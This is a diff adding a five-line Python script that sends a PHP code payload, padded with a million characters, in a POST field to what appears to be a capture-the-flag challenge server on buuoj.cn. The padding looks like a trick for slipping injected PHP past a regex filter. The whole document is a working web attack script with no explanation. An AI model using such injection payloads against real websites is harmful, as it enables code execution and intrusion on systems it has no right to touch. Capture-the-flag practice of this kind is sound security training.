@@ -1,0 +1,5 @@
+import requests
+
+payload = '<?php phpinfo(); ?>' + 'a'*1000000
+resp = requests.post('http://222aa365-2c06-4e33-9bed-4b541523db0c.node5.buuoj.cn:81/', data={"_":payload})
+print(resp.text)
